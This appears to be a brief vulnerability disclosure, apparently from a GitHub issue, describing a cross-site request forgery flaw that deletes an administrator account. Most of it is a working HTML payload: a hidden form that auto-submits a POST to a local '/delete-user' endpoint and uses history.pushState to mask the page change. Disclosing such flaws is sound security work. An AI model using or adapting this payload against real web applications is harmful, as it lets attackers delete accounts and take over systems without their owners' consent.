

https://github.com/user-attachments/assets/e68cc276-fb59-463c-ad05-35afdc00aa19

CSRF Leading to Administrator Account Deletion and Full System Takeover



Payload:


```

<html>
  <body>
    <form action="http://localhost:5000/delete-user?Cg1hZG1pbmlzdHJhdG9y" method="POST">
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>

```
